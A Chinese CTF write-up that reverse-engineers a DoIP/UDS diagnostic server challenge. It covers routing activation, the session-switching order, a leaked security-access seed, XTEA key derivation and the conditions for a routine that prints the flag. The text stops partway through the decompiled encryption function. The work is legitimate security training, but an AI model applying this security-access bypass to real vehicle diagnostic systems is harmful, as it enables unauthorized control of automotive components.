# 记一道UDS诊断类型的CTF赛题

刚好这周是在学习UDS诊断相关知识，搜到一道相关赛题，该赛题出自于"2022数字中国车联网安全CTF"。

## 0x01 题目介绍

题目描述：小明从汽车某个部件中提取出一个名为uds_server的二进制，但是因为权限不足，在根目录下的flag文件提取不出来，你能帮小明拿到flag么？题目端口9912

题目附件：[附件](https://github.com/t0night/t0night/blob/main/AllFiles/2022%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8CTF-uds_server)

```bash
➜  ~ md5sum uds_server
f678c4521e34ecfb4317e4b70864203f  uds_server
➜  ~ file uds_server
uds_server: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cb32288194d5c89059fc3b932c1935283d800bb8, for GNU/Linux 3.2.0, with debug_info, not stripped
➜  ~ checksec uds_server
[*] '/root/uds_server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



## 0x02 分析附件

使用Ghidra打开uds_server，经过分析可以发现该二进制文件是基于C++开发的。

从main函数开始分析，main函数主要功能是监听了13400端口，通过fork函数来进行多连接处理。

```c++

int main(int argc,char **argv,char **envp)

{
  int iVar1;
  __pid_t _Var2;
  int enable;
  int serverFd;
  int clientFd;
  Server tempServer;
  sockaddr_in servaddr;
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  if ((1 < argc) && (iVar1 = strcmp(argv[1],"-inted"), iVar1 == 0)) { // 判断是否存在“-inted”命令行参数，若存在则只进行一次Server、loop
    Server::Server(&tempServer,0,1);
                    /* try { // try from 00103865 to 00103869 has its CatchHandler @ 00103a6a */
    Server::loop(&tempServer);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  serverFd = socket(2,1,0);//创建socket
  if (serverFd < 0) {
    std::operator<<((basic_ostream *)std::cout,"create socket error\n");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  enable = 1;
  iVar1 = setsockopt(serverFd,1,2,&enable,4);
  if (-1 < iVar1) {
    memset(&servaddr,0,0x10);
    servaddr.sin_family = 2;
    servaddr.sin_addr = htonl(0);
    servaddr.sin_port = htons(0x3458);//监听13400端口
    iVar1 = bind(serverFd,(sockaddr *)&servaddr,0x10);//绑定
    if (iVar1 < 0) {
      std::operator<<((basic_ostream *)std::cout,"bind failed\n");
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    iVar1 = listen(serverFd,100);//监听
    if (-1 < iVar1) {
      std::operator<<((basic_ostream *)std::cout,"Server listen on port 13400\n");
      while( true ) {
        while (clientFd = accept(serverFd,(sockaddr *)0x0,(socklen_t *)0x0), clientFd < 0) {//接受socket的数据
          std::operator<<((basic_ostream *)std::cout,"accept client failed\n");
        }
        std::operator<<((basic_ostream *)std::cout,"accept new client!\n");
        _Var2 = fork();//创建子进程
        if (_Var2 != 0) break;
        close(clientFd);
      }
      Server::Server(&tempServer,clientFd,clientFd);//初始化server对象，调用其构造函数
                    /* try { // try from 00103a49 to 00103a4d has its CatchHandler @ 00103a8b */
      Server::loop(&tempServer);//调用Server对象的loop函数
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    std::operator<<((basic_ostream *)std::cout,"listen failed\n");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  std::operator<<((basic_ostream *)std::cout,"setsockopt failed\n");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}

```



Server::server函数中初始化各种成员变量，值得注意的是利用mmap申请了两块内存backdoorMem、progMem，其中backdoorMem地址是随机的，progMem地址是固定为0x123000的。

```c++

void __thiscall Server::Server(Server *this,int inputFd,int outputFd)

{
  uint uVar1;
  uint *puVar2;
  uchar *puVar3;
  uint tmpAddr;
  
  std::vector<unsigned_char,_std::allocator<unsigned_char>_>::vector(&this->seed);
  alarm(0x3c);
  this->inputFd = inputFd;
  this->outputFd = outputFd;
  this->hasRegisterd = false;
  this->securityLevel = 0;
  this->currentSession = 0;
  this->fileFd = -1;
  this->runningTime = 0;
  this->lastAliveTime = 0;
                    /* try { // try from 00103e4d to 00103f0c has its CatchHandler @ 00103f27 */
  uVar1 = randomNum();
  while (tmpAddr = uVar1 & 0xfffff000, tmpAddr < 0x123001) {
    uVar1 = randomNum();
  }
  puVar2 = (uint *)mmap((void *)(ulong)tmpAddr,0x1000,6,0x22,-1,0);
  this->backdoorMem = puVar2;
  puVar3 = (uchar *)mmap((void *)0x123000,0x1000,6,0x22,-1,0);
  this->progMem = puVar3;
  if ((this->backdoorMem == (uint *)(ulong)tmpAddr) && (this->progMem == (uchar *)0x123000)) {
    *this->backdoorMem = 0;
    return;
  }
  fwrite("failed to mmap\n",1,0xf,stderr);
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```



Server::loop函数中，首先是读取socket数据，然后parseMessage解析数据，根据数据来进行check。dataType有三种类型，分别是：RoutingActivat、更新lastAliveTime、诊断消息。想要进行0x8001诊断消息，必须满足两个条件this->hasRegisterd == true和msg.data的长度大于4

```c++

void __thiscall Server::loop(Server *this)

{
  long lVar1;
  byte bVar2;
  bool bVar3;
  int iVar4;
  ssize_t sVar5;
  size_type sVar6;
  long lVar7;
  __fd_mask *p_Var8;
  long in_FS_OFFSET;
  int __d0;
  int __d1;
  int ret;
  int recvSize;
  timeval tv;
  vector<unsigned_char,_std::allocator<unsigned_char>_> data;
  DoipMessage msg;
  DoipAliveCheckRequestMessage aliveCheckMsg;
  fd_set fds;
  uchar tempBuffer [4096];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  std::vector<unsigned_char,_std::allocator<unsigned_char>_>::vector(&data);
  while( true ) {
    lVar7 = 0x10;
    p_Var8 = fds.fds_bits;
    for (; lVar7 != 0; lVar7 = lVar7 + -1) {
      *p_Var8 = 0;
      p_Var8 = p_Var8 + 1;
    }
    iVar4 = this->inputFd;
    if (iVar4 < 0) {
      iVar4 = iVar4 + 0x3f;
    }
    bVar2 = (byte)(this->inputFd >> 0x37);
    fds.fds_bits[iVar4 >> 6] =
         fds.fds_bits[iVar4 >> 6] |
         1 << (((char)this->inputFd + (bVar2 >> 2) & 0x3f) - (bVar2 >> 2) & 0x3f);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
                    /* try { // try from 0010404c to 00104072 has its CatchHandler @ 0010445f */
    iVar4 = select(this->inputFd + 1,(fd_set *)&fds,(fd_set *)0x0,(fd_set *)0x0,(timeval *)&tv);
    if (iVar4 < 0) break;
    this->runningTime = (this->runningTime - (int)(tv.tv_usec / 1000)) + 1000;
    if (((this->hasRegisterd != true) && (4999 < this->runningTime)) ||
       ((this->hasRegisterd != false && (9999 < this->runningTime - this->lastAliveTime))))
    goto LAB_001043f6;
    if ((4999 < this->runningTime - this->lastAliveTime) && (this->hasRegisterd != false)) {
      DoipAliveCheckRequestMessage::DoipAliveCheckRequestMessage(&aliveCheckMsg);
                    /* try { // try from 00104169 to 0010416d has its CatchHandler @ 00104417 */
      sendMessage(this,(DoipMessage *)&aliveCheckMsg);
      DoipAliveCheckRequestMessage::~DoipAliveCheckRequestMessage(&aliveCheckMsg);
    }
    if (iVar4 != 0) {
                    /* try { // try from 001041a4 to 0010421d has its CatchHandler @ 0010445f */
      sVar5 = read(this->inputFd,tempBuffer,0x1000);//读取socket传输过来的数据
      if ((int)sVar5 < 1) goto LAB_001043f6;
      msg._vptr.DoipMessage =
           (anon_subr_int_varargs_for__vptr.DoipMessage **)
           std::vector<unsigned_char,_std::allocator<unsigned_char>_>::end(&data);
      __gnu_cxx::
      __normal_iterator<unsigned_char_const*,_std::vector<unsigned_char,_std::allocator<unsigned_cha r>_>_>
      ::__normal_iterator<unsigned_char*>
                ((__normal_iterator<unsigned_char_const*,_std::vector<unsigned_char,_std::allocator< unsigned_char>_>_>
                  *)&aliveCheckMsg,
                 (__normal_iterator<unsigned_char*,_std::vector<unsigned_char,_std::allocator<unsign ed_char>_>_>
                  *)&msg);
      std::vector<unsigned_char,_std::allocator<unsigned_char>_>::insert<unsigned_char*>
                (&data,(const_iterator)aliveCheckMsg.super_DoipMessage._vptr.DoipMessage,tempBuffer,
                 tempBuffer + (int)sVar5);//将读到tempBuffer中的数据存在data变量中
      sVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::size(&data);//获取data的长度，经过调试，发现size函数不是按照“\x00”来判断是否是字符串的结尾
      if (7 < sVar6) {
        DoipMessage::DoipMessage(&msg);//创建了DoipMessage对象并且调用构造函数
                    /* try { // try from 0010425f to 00104263 has its CatchHandler @ 00104447 */
        bVar3 = DoipMessage::parseMessage(&msg,&data);//调用该函数解析data，解析后的数据存在msg中
        if (bVar3 == false) {
          sVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::size(&data);
          if (0xffff < sVar6) {
            std::vector<unsigned_char,_std::allocator<unsigned_char>_>::clear(&data);
          }
        }
        else {
          if ((((msg.dataType == 5) || (msg.dataType == 8)) || (msg.dataType == 0x8001)) &&
             (((this->hasRegisterd == true || (msg.dataType != 0x8001)) &&
              ((msg.dataType != 0x8001 ||
               (sVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::size(&msg.data),
               4 < sVar6)))))) {
            bVar3 = false;
          }
          else {
            bVar3 = true;
          }
          if (bVar3) {
            DoipMessage::DoipMessage((DoipMessage *)&aliveCheckMsg,0);
                    /* try { // try from 00104310 to 00104314 has its CatchHandler @ 0010442f */
            sendMessage(this,(DoipMessage *)&aliveCheckMsg);
            DoipMessage::~DoipMessage((DoipMessage *)&aliveCheckMsg);
          }
          else if (msg.dataType == 5) {
                    /* try { // try from 00104350 to 0010439f has its CatchHandler @ 00104447 */
            handleRoutingActivationMessage(this,&msg);//用于激活路由
          }
          else if (msg.dataType == 8) {
            this->lastAliveTime = this->runningTime;
          }
          else if (msg.dataType == 0x8001) {
            handleUdsMessage(this,&msg);//诊断消息
          }
        }
        DoipMessage::~DoipMessage(&msg);
      }
    }
  }
  std::operator<<((basic_ostream *)std::cout,"select failed\n");
LAB_001043f6:
  std::vector<unsigned_char,_std::allocator<unsigned_char>_>::~vector(&data);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}


```

DoipMessage::parseMessag解析data规则如下所示：

```c
struct Doip
{
    char protocolVersion;//必须是'\x02'
    char inverseProtocolVersion;//必须是'\xfd'
    char dataType[2];//5、8、0x8001
    char len[4];//data数据长度
    char data[...];//长度大于0小于1000
};
```

会根据Doip->len把Doip->data的数据存到msg.data



当dataType等于5时，会调用handleRoutingActivationMessage来激活路由，当sourceAddress等于1且activationType等于‘\x00’时，才可以把hasRegisterd赋值成true

```c++

void __thiscall Server::handleRoutingActivationMessage(Server *this,DoipMessage *msg)

{
  long lVar1;
  bool bVar2;
  long in_FS_OFFSET;
  vector<unsigned_char,_std::allocator<unsigned_char>_> reservedOem;
  DoipMessage rejectMsg;
  DoipRoutingActivationRequestMessage reqMsg;
  DoipRoutingActivationResponseMessage respMsg;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  std::vector<unsigned_char,_std::allocator<unsigned_char>_>::vector(&reservedOem);
                    /* try { // try from 00104566 to 0010456a has its CatchHandler @ 00104719 */
  DoipRoutingActivationResponseMessage::DoipRoutingActivationResponseMessage
            (&respMsg,1,0x100,'\x10');
                    /* try { // try from 0010457f to 00104583 has its CatchHandler @ 00104704 */
  DoipRoutingActivationRequestMessage::DoipRoutingActivationRequestMessage(&reqMsg,msg);
                    /* try { // try from 0010458e to 00104592 has its CatchHandler @ 001046ec */
  bVar2 = DoipRoutingActivationRequestMessage::parseMessage(&reqMsg);//解析doip中data部分
  if (bVar2 == true) {
    if (reqMsg.sourceAddress == 1) {//限制条件 
      if (reqMsg.activationType == '\0') {//限制条件 
        this->hasRegisterd = true;//target
        this->lastAliveTime = this->runningTime;
        sendMessage(this,&respMsg.super_DoipMessage);
      }
      else {
        respMsg.routingActivationResponse = '\x06';
        sendMessage(this,&respMsg.super_DoipMessage);
      }
    }
    else {
      respMsg.routingActivationResponse = '\0';
                    /* try { // try from 00104602 to 0010466e has its CatchHandler @ 001046ec */
      sendMessage(this,&respMsg.super_DoipMessage);
    }
  }
  else {
    DoipMessage::DoipMessage(&rejectMsg,0);
                    /* try { // try from 001045c2 to 001045c6 has its CatchHandler @ 001046d4 */
    sendMessage(this,&rejectMsg);
    DoipMessage::~DoipMessage(&rejectMsg);
  }
  DoipRoutingActivationRequestMessage::~DoipRoutingActivationRequestMessage(&reqMsg);
  DoipRoutingActivationResponseMessage::~DoipRoutingActivationResponseMessage(&respMsg);
  std::vector<unsigned_char,_std::allocator<unsigned_char>_>::~vector(&reservedOem);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

DoipRoutingActivationRequestMessage::parseMessage解析data部分如下所示：

```c
struct Doip
{
    char protocolVersion;
    char inverseProtocolVersion;
    char dataType[2];
    char dataLen[4];
    //data
    char sourceAddress[2];
    char activationType;
    char reservedIso[4];
    char reservedOem[...];
};
```

当dataType等于0x8001时，会调用handleUdsMessage函数进行诊断服务类型

```c

void __thiscall Server::handleUdsMessage(Server *this,DoipMessage *msg)

{
  long lVar1;
  bool bVar2;
  int iVar3;
  uchar *puVar4;
  undefined4 extraout_var;
  long in_FS_OFFSET;
  UdsService *service;
  DoipMessage *respMsg;
  DoipDiagnosticRequstMessage reqMsg;
  DoipMessage rejectMsg;
  DoipMessage *msg_00;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  DoipDiagnosticRequstMessage::DoipDiagnosticRequstMessage(&reqMsg,msg);
                    /* try { // try from 0010479a to 0010479e has its CatchHandler @ 00104ab6 */
  bVar2 = DoipDiagnosticRequstMessage::parseMessage(&reqMsg);
  if (((bVar2 == true) && (reqMsg.sourceAddress == 1)) && (reqMsg.targetAddress == 0x100)) {
    bVar2 = false;
  }
  else {
    bVar2 = true;
  }
  if (bVar2) {
    DoipMessage::DoipMessage(&rejectMsg,0);
                    /* try { // try from 001047ec to 001047f0 has its CatchHandler @ 00104a8c */
    sendMessage(this,&rejectMsg);
    DoipMessage::~DoipMessage(&rejectMsg);
  }
  else {
    puVar4 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data
                       (&reqMsg.super_DoipMessage.data);
    switch(*puVar4) {
    case '\x10':
                    /* try { // try from 0010485f to 00104965 has its CatchHandler @ 00104ab6 */
      service = (UdsService *)operator.new(0x10);
      UdsSessionControlService::UdsSessionControlService((UdsSessionControlService *)service,this);
      break;
    default:
      puVar4 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data
                         (&reqMsg.super_DoipMessage.data);
      UdsNegativeResponseMessage::UdsNegativeResponseMessage
                ((UdsNegativeResponseMessage *)&rejectMsg,*puVar4,'\x11');
                    /* try { // try from 001049c1 to 001049c5 has its CatchHandler @ 00104aa1 */
      sendMessage(this,&rejectMsg);
      UdsNegativeResponseMessage::~UdsNegativeResponseMessage
                ((UdsNegativeResponseMessage *)&rejectMsg);
      goto LAB_00104a69;
    case '\'':
      service = (UdsService *)operator.new(0x10);
      UdsSecurityAccessService::UdsSecurityAccessService((UdsSecurityAccessService *)service,this);
      break;
    case '1':
      service = (UdsService *)operator.new(0x10);
      UdsRoutineControlService::UdsRoutineControlService((UdsRoutineControlService *)service,this);
      break;
    case '6':
      service = (UdsService *)operator.new(0x10);
      UdsTransferDataService::UdsTransferDataService((UdsTransferDataService *)service,this);
      break;
    case '7':
      service = (UdsService *)operator.new(0x10);
      UdsRequestTransferExitService::UdsRequestTransferExitService
                ((UdsRequestTransferExitService *)service,this);
      break;
    case '8':
      service = (UdsService *)operator.new(0x10);
      UdsRequestFileTransferService::UdsRequestFileTransferService
                ((UdsRequestFileTransferService *)service,this);
      break;
    case '=':
      service = (UdsService *)operator.new(0x10);
      UdsWriteMemoryByAddressService::UdsWriteMemoryByAddressService
                ((UdsWriteMemoryByAddressService *)service,this);
    }
                    /* try { // try from 001049fe to 00104a29 has its CatchHandler @ 00104ab6 */
    iVar3 = (**service->_vptr.UdsService)(service,&reqMsg);
    msg_00 = (DoipMessage *)CONCAT44(extraout_var,iVar3);
    if ((msg_00 != (DoipMessage *)0x0) && (sendMessage(this,msg_00), msg_00 != (DoipMessage *)0x0))
    {
      DoipMessage::~DoipMessage(msg_00);
      operator.delete(msg_00,0x28);
    }
    if (service != (UdsService *)0x0) {
      operator.delete(service,0x10);
    }
  }
LAB_00104a69:
  DoipDiagnosticRequstMessage::~DoipDiagnosticRequstMessage(&reqMsg);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

该函数定义了6中诊断类型，分别是：

- UdsSessionControlService
- UdsSecurityAccessService
- UdsRoutineControlService
- UdsTransferDataService
- UdsRequestTransferExitService
- UdsRequestFileTransferService
- UdsWriteMemoryByAddressService

但有一个条件就是sourceAddress等于1且targetAddress等于0x100。

DoipDiagnosticRequstMessage::parseMessage解析data部分如下所示：

```c
struct Doip
{
    char protocolVersion;
    char inverseProtocolVersion;
    char dataType[2];
    char dataLen[4];
    //data
    char sourceAddress[2];
    char targetAddress[2];
    char reqMsg_data[...];
};
```

当sourceAddress和targetAddress满足时，会根据reqMsg_data第一个字节来决定调用哪个诊断服务。

为了能达到解题的目的，我们先来看UdsRoutineControlService，当option为0x31时，会调用该诊断服务，可以看到该函数可以执行”/getflag“，且会把执行的结果通过socket返回到客户端。

```c

DoipMessage * __thiscall
UdsRoutineControlService::handleMessage
          (UdsRoutineControlService *this,DoipDiagnosticRequstMessage *message)

{
  long lVar1;
  bool bVar2;
  UdsNegativeResponseMessage *this_00;
  FILE *__stream;
  size_t __n;
  long in_FS_OFFSET;
  DoipMessage *respMsg;
  FILE *fp;
  UdsRoutineControlMessage msg;
  char flag [256];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  UdsRoutineControlMessage::UdsRoutineControlMessage(&msg,message);
  bVar2 = UdsRoutineControlMessage::parseMessage(&msg);
  if (bVar2 == true) {
    if ((((this->super_UdsService).server)->securityLevel == 1) &&
       (((this->super_UdsService).server)->currentSession == 2)) {
      if ((msg.routineControlType == '\x01') &&
         ((msg.routineIdentifier == 0xbac4 &&
          (*((this->super_UdsService).server)->backdoorMem == 0xdeadbeef)))) {
        memset(flag,0,0x100);
        __stream = popen("/getflag","r");
        if (__stream != (FILE *)0x0) {
          fgets(flag,0x100,__stream);
          pclose(__stream);
        }
        __n = strlen(flag);
        write(((this->super_UdsService).server)->outputFd,flag,__n);
      }
      this_00 = (UdsNegativeResponseMessage *)operator.new(0x50);
      UdsNegativeResponseMessage::UdsNegativeResponseMessage(this_00,'1','\x10');
    }
    else {
      this_00 = (UdsNegativeResponseMessage *)operator.new(0x50);
      UdsNegativeResponseMessage::UdsNegativeResponseMessage(this_00,'1','\"');
    }
  }
  else {
                    /* try { // try from 0010a062 to 0010a1c4 has its CatchHandler @ 0010a20b */
    this_00 = (UdsNegativeResponseMessage *)operator.new(0x50);
    UdsNegativeResponseMessage::UdsNegativeResponseMessage(this_00,'1','\x13');
  }
  UdsRoutineControlMessage::~UdsRoutineControlMessage(&msg);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (DoipMessage *)this_00;
}
```

要想执行到popen函数，需满足以下条件：

- securityLevel==1
- currentSession==2
- routineControlType=='\x01'
- routineIdentifier==0xbac4
- *backdoorMem==0xdeadbeef



控制securityLevel是在UdsSecurityAccessService函数中，经过分析该函数，若要把securityLevel赋值为1，另需两个条件：

- currentSession==2
- xtea加密的seed == key(可控)

```c

DoipMessage * __thiscall
UdsSecurityAccessService::handleMessage
          (UdsSecurityAccessService *this,DoipDiagnosticRequstMessage *message)

{
  uchar uVar1;
  long lVar2;
  DoipMessage *pDVar3;
  bool bVar4;
  UdsNegativeResponseMessage *pUVar5;
  time_t tVar6;
  UdsSecurityAccessPositiveMessage *pUVar7;
  size_type sVar8;
  uchar *puVar9;
  uint uVar10;
  long in_FS_OFFSET;
  value_type local_c2;
  bool equal;
  uint randNum;
  int i;
  int i_1;
  int i_2;
  DoipMessage *respMsg;
  vector<unsigned_char,_std::allocator<unsigned_char>_> tmpData;
  vector<unsigned_char,_std::allocator<unsigned_char>_> outputData;
  UdsSecurityAccessMessage msg;
  
  lVar2 = *(long *)(in_FS_OFFSET + 0x28);
  UdsSecurityAccessMessage::UdsSecurityAccessMessage(&msg,message);
  respMsg = (DoipMessage *)0x0;
                    /* try { // try from 001092d3 to 001093fa has its CatchHandler @ 0010971f */
  bVar4 = UdsSecurityAccessMessage::parseMessage(&msg);
  if (bVar4 == true) {
    if (((this->super_UdsService).server)->currentSession == 2) {
      if (msg.securityAccessType == '\x01') {
        ((this->super_UdsService).server)->securityLevel = 0;
        tVar6 = time((time_t *)0x0);
        srand((uint)tVar6);
        randNum = rand();
        std::vector<unsigned_char,_std::allocator<unsigned_char>_>::clear
                  (&((this->super_UdsService).server)->seed);
        for (i = 0; i < 4; i = i + 1) {
          outputData.super__Vector_base<unsigned_char,_std::allocator<unsigned_char>_>._M_impl.
          super_allocator<unsigned_char> = SUB41(randNum,0);
          std::vector<unsigned_char,_std::allocator<unsigned_char>_>::push_back
                    (&((this->super_UdsService).server)->seed,(value_type *)&outputData);
          randNum = randNum >> 8;
        }
        pUVar7 = (UdsSecurityAccessPositiveMessage *)operator.new(0x68);
                    /* try { // try from 00109418 to 0010941c has its CatchHandler @ 001096e2 */
        UdsSecurityAccessPositiveMessage::UdsSecurityAccessPositiveMessage
                  (pUVar7,'\x01',&((this->super_UdsService).server)->seed);
        respMsg = (DoipMessage *)pUVar7;
      }
      else if (msg.securityAccessType == '\x02') {
        if (((this->super_UdsService).server)->securityLevel == 1) {
                    /* try { // try from 0010944d to 001094de has its CatchHandler @ 0010971f */
          pUVar7 = (UdsSecurityAccessPositiveMessage *)operator.new(0x68);
          UdsSecurityAccessPositiveMessage::UdsSecurityAccessPositiveMessage(pUVar7,'\x01');
          respMsg = (DoipMessage *)pUVar7;
        }
        else {
          sVar8 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::size
                            (&((this->super_UdsService).server)->seed);
          if (sVar8 == 0) {
            pUVar5 = (UdsNegativeResponseMessage *)operator.new(0x50);
            UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar5,'\'','$');
            respMsg = (DoipMessage *)pUVar5;
          }
          else {
            sVar8 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::size(&msg.key);
            if (sVar8 == 4) {
              std::vector<unsigned_char,_std::allocator<unsigned_char>_>::vector(&tmpData);
              std::vector<unsigned_char,_std::allocator<unsigned_char>_>::vector(&outputData);
              for (i_1 = 0; i_1 < 8; i_1 = i_1 + 1) {
                puVar9 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data
                                   (&((this->super_UdsService).server)->seed);
                uVar10 = (uint)(i_1 >> 0x1f) >> 0x1e;
                local_c2 = puVar9[(int)((i_1 + uVar10 & 3) - uVar10)] + (char)i_1;
                    /* try { // try from 00109583 to 0010965b has its CatchHandler @ 001096fb */
                std::vector<unsigned_char,_std::allocator<unsigned_char>_>::push_back
                          (&tmpData,&local_c2);
              }
              xteaEncryptGetKey(&tmpData,&outputData);
              equal = true;
              for (i_2 = 0; i_2 < 4; i_2 = i_2 + 1) {
                puVar9 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(&msg.key);
                uVar1 = puVar9[i_2];
                puVar9 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data
                                   (&outputData);
                if (uVar1 != puVar9[i_2]) {
                  equal = false;
                }
              }
              if (equal == false) {
                pUVar5 = (UdsNegativeResponseMessage *)operator.new(0x50);
                UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar5,'\'','3');
                respMsg = (DoipMessage *)pUVar5;
              }
              else {
                ((this->super_UdsService).server)->securityLevel = 1;
                pUVar7 = (UdsSecurityAccessPositiveMessage *)operator.new(0x68);
                UdsSecurityAccessPositiveMessage::UdsSecurityAccessPositiveMessage(pUVar7,'\x02');
                respMsg = (DoipMessage *)pUVar7;
              }
              std::vector<unsigned_char,_std::allocator<unsigned_char>_>::~vector(&outputData);
              std::vector<unsigned_char,_std::allocator<unsigned_char>_>::~vector(&tmpData);
            }
            else {
              pUVar5 = (UdsNegativeResponseMessage *)operator.new(0x50);
              UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar5,'\'','3');
              respMsg = (DoipMessage *)pUVar5;
            }
          }
        }
      }
      else {
                    /* try { // try from 0010969a to 0010969e has its CatchHandler @ 0010971f */
        pUVar5 = (UdsNegativeResponseMessage *)operator.new(0x50);
        UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar5,'\'','\x12');
        respMsg = (DoipMessage *)pUVar5;
      }
    }
    else {
      pUVar5 = (UdsNegativeResponseMessage *)operator.new(0x50);
      UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar5,'\'','\"');
      respMsg = (DoipMessage *)pUVar5;
    }
  }
  else {
    pUVar5 = (UdsNegativeResponseMessage *)operator.new(0x50);
    UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar5,'\'','\x13');
    respMsg = (DoipMessage *)pUVar5;
  }
  pDVar3 = respMsg;
  UdsSecurityAccessMessage::~UdsSecurityAccessMessage(&msg);
  if (lVar2 == *(long *)(in_FS_OFFSET + 0x28)) {
    return pDVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```



先解决currentSession的问题，currentSession在UdsSessionControlService函数中控制，如下所示，

```c
DoipMessage *__cdecl UdsSessionControlService::handleMessage(UdsSessionControlService *const this, DoipDiagnosticRequstMessage *message)
{
  UdsNegativeResponseMessage *v2; // rbx
  signed __int64 v3; // rsi
  UdsSessionControlPositiveMessage *v4; // rbx
  UdsNegativeResponseMessage *v5; // rbx
  __int64 v6; // rdx
  DoipMessage *result; // rax
  __int64 v8; // rcx
  unsigned __int64 v9; // rt1
  DoipMessage *respMsg; // [rsp+18h] [rbp-60h]
  UdsSessionControlMessage msg; // [rsp+20h] [rbp-58h]
  unsigned __int64 v12; // [rsp+58h] [rbp-20h]

  __asm { endbr64 }
  v12 = __readfsqword(0x28u);
  UdsSessionControlMessage::UdsSessionControlMessage(&msg, message);
  if ( !UdsSessionControlMessage::parseMessage(&msg) )
  {
    v2 = sub_3520(80LL);
    v3 = 16LL;
    UdsNegativeResponseMessage::UdsNegativeResponseMessage(v2, 0x10u, 0x12u);
  }
  else
  {
    if ( msg.diagnosticSessionType == 2 && this->server->currentSession != 3 )
    {
      v5 = sub_3520(80LL);
      v3 = 16LL;
      UdsNegativeResponseMessage::UdsNegativeResponseMessage(v5, 0x10u, 0x22u);
      respMsg = &v5->0;
    }
    else
    {
      this->server->currentSession = msg.diagnosticSessionType;
      v4 = sub_3520(80LL);
      v3 = msg.diagnosticSessionType;
      UdsSessionControlPositiveMessage::UdsSessionControlPositiveMessage(v4, msg.diagnosticSessionType);
      respMsg = &v4->0;
    }
    v2 = respMsg;
  }
  UdsSessionControlMessage::~UdsSessionControlMessage(&msg);
  result = &v2->0;
  v9 = __readfsqword(0x28u);
  v8 = v9 ^ v12;
  if ( v9 != v12 )
    result = sub_3550(&msg, v3, v6, v8);
  return result;
}
```

为了能够把currentSession设置成2，需先两步：

- 第一次currentSession为0，diagnosticSessionType=3，
- 第二部currentSession被第一步赋值成3，diagnosticSessionType=2



接着再来看UdsSecurityAccessService，解决过currentSession的问题，剩下seed的问题，当securityAccessType为'\x01'时，securityLevel被赋值成0，然后初始化seed，seed是由rand函数生成，srand的种子是”time(0)“，也就是说该seed值是完全随机的，但是初始化成功之后，会把seed的值追加到response，也就导致seed值泄露。

当securityAccessType为'\x02'，会先检车seed是否已经初始化，若初始化，则会调用xteaEncryptGetKey函数把seed经过一定的转换后再加密，然后与客户端输入的key进行对比，若一致，则会把securityLevel赋值成1。

seed转换方式如下所示：

```python
for i in range(8):
    data+= chr(ord(seed[i%4])+i)
```

转换后调用xteaEncryptGetKey函数进行加密：

```c++

void xteaEncryptGetKey(vector<unsigned_char,_std::allocator<unsigned_char>_> *data,
                      vector<unsigned_char,_std::allocator<unsigned_char>_> *outputData)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  long lVar4;
  byte *pbVar5;
  uchar *puVar6;
  long in_FS_OFFSET;
  value_type local_59;
  uint v0;
  uint v1;
  uint sum;
  int i;
  uint key;
  int i_1;
  uint delta;
  uint n;
  uint k [4];
  
  lVar4 = *(long *)(in_FS_OFFSET + 0x28);
  k[0] = 0x1234567;
  k[1] = 0x89abcdef;
  k[2] = 0xdeadbeef;
  k[3] = 0xbeefdead;
  pbVar5 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(data);
  bVar1 = *pbVar5;
  puVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(data);
  bVar2 = puVar6[1];
  puVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(data);
  bVar3 = puVar6[2];
  puVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(data);
  v0 = (uint)puVar6[3] * 0x1000000 + (uint)bVar1 + (uint)bVar2 * 0x100 + (uint)bVar3 * 0x10000;
  puVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(data);
  bVar1 = puVar6[4];
